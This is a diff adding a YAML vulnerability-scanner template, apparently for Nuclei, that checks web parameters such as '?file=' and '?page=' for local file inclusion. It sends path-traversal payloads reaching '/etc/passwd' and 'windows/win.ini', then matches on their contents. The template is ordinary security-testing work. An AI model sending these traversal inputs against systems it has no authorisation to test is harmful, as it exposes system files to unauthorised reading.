@@ -1,0 +1,41 @@
+id: lfi-basic
+
+info:
+  name: Local File Inclusion (LFI) - Basic
+  author: Kalkaneus Team
+  severity: high
+  description: Detects basic LFI vulnerabilities
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: lfi,file-inclusion,path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}../../../../etc/passwd"
+      - "{{BaseURL}}{{Path}}..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}{{Path}}....//....//....//....//etc/passwd"
+      - "{{BaseURL}}{{Path}}../../../../windows/win.ini"
+      - "{{BaseURL}}{{Path}}..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
+    
+    payloads:
+      Path:
+        - "?file="
+        - "?page="
+        - "?include="
+        - "?path="
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+        
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "[fonts]"
+          - "for 16-bit app support"
+        condition: or
